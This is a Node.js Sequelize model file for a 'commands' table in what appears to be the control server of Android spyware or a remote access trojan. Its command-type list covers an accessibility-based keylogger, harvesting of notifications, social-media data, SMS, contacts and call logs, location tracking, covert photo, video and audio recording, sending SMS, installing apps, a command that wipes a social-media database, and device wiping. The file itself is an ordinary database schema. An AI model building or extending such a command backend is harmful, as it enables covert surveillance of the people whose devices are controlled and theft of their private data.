const { DataTypes } = require('sequelize');

module.exports = (sequelize) => {
  const Command = sequelize.define('Command', {
    id: {
      type: DataTypes.UUID,
      defaultValue: DataTypes.UUIDV4,
      primaryKey: true
    },
    deviceId: {
      type: DataTypes.STRING,
      allowNull: false,
      comment: 'References devices.deviceId (string unique device identifier)'
    },
    command_type: {
      type: DataTypes.ENUM(
        'unknown','login','custom',
        'push_tokens','push_data','start_repeat_push_data','stop_repeat_push_data','sync_app_config',
        'push_call_logs','add_call_log','delete_call_log',
        'push_contacts','add_contact','delete_contact',
        'push_messages','send_message',
        'push_file_explorer_walk','push_thumbnails','delete_file','push_file','push_files','get_pending_push_files','delete_pending_push_files','sync_push_files',
        'push_location',
        'vibrate','flash',
        'take_picture','record_video','record_audio',
        'push_installed_app_list','push_app_logs','push_device_info','open_app','make_call','open_deeplink',
        'get_diagnosis','schedule_command','cancel_scheduled_command','start_initializer',
        'connect_socket','disconnect_socket',
        'run_accessibility_command','push_accessibility_keylogger','push_accessibility_notifications','push_accessibility_social_media','accessibility_nuke_social_media_database',
        'set_device_audio','push_device_audio','play_sound',
        'set_dynamic_config','push_dynamic_config',
        'location_request','take_photo','get_contacts','get_sms','send_sms','get_call_logs','get_device_info','lock_device','unlock_device','wipe_device','install_app','uninstall_app','get_installed_apps','show_message'
      ),
      allowNull: false
    },
    command_data: {
      type: DataTypes.JSON,
      allowNull: true,
      comment: 'Command parameters and data'
    },
    status: {
      type: DataTypes.ENUM('pending','sent','acknowledged','completed','failed','expired'),
      defaultValue: 'pending'
    },
    priority: {
      type: DataTypes.ENUM('low','normal','high','urgent'),
      defaultValue: 'normal'
    },
    created_by: {
      type: DataTypes.UUID,
      allowNull: true,
      comment: 'User ID who created the command'
    },
    sent_at: {
      type: DataTypes.DATE,
      allowNull: true
    },
    acknowledged_at: {
      type: DataTypes.DATE,
      allowNull: true
    },
    completed_at: {
      type: DataTypes.DATE,
      allowNull: true
    },
    expires_at: {
      type: DataTypes.DATE,
      allowNull: true
    },
    response_data: {
      type: DataTypes.JSON,
      allowNull: true
    },
    error_message: {
      type: DataTypes.TEXT,
      allowNull: true
    },
    retry_count: {
      type: DataTypes.INTEGER,
      allowNull: false,
      defaultValue: 0
    },
    max_retries: {
      type: DataTypes.INTEGER,
      defaultValue: 3
    },
    metadata: {
      type: DataTypes.JSON,
      allowNull: true
    }
  }, {
    tableName: 'commands',
    timestamps: true,
    paranoid: true,         // keep deleted_at column
    underscored: true,      // created_at, updated_at, deleted_at
    indexes: [
      { name: 'idx_commands_device_id', fields: ['deviceId'] },
      { name: 'idx_commands_command_type', fields: ['command_type'] },
      { name: 'idx_commands_status', fields: ['status'] },
      { name: 'idx_commands_created_at', fields: ['created_at'] }
    ],
    // no afterSync hook required; we'll use a sync helper instead
  });

  // association is set from Device model (Device.hasMany(Command,...))
  // add safe sync helper to ensure DB FK exists
  Command.syncWithDatabase = async function(options = {}) {
    const queryInterface = this.sequelize.getQueryInterface();
    try {
      // Sync model (create table if needed)
      await this.sync(options);

      // Ensure updated_at exists (tolerant)
      const [cols] = await queryInterface.sequelize.query(
        `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'commands'`
      );

      const colNames = cols.map(c => c.COLUMN_NAME);
      if (!colNames.includes('updated_at')) {
        // add updated_at column if missing
        await queryInterface.addColumn('commands', 'updated_at', { type: DataTypes.DATE, allowNull: true });
      }

      // Add FK constraint referencing devices.deviceId
      // remove if present then add with standardized name
      const fkName = 'commands_deviceId_fkey';
      try { await queryInterface.removeConstraint('commands', fkName); } catch (_) {}
      try {
        await queryInterface.addConstraint('commands', {
          fields: ['deviceId'],
          type: 'foreign key',
          name: fkName,
          references: { table: 'devices', field: 'deviceId' },
          onDelete: 'CASCADE',
          onUpdate: 'CASCADE'
        });
      } catch (err) {
        // If addConstraint fails, just log and continue (many dev setups won't need the FK)
        console.warn('Could not create FK commands->devices (non-fatal):', err.message || err);
      }

      return true;
    } catch (err) {
      console.error('Error in Command.syncWithDatabase:', err);
      return false;
    }
  };

  return Command;
};
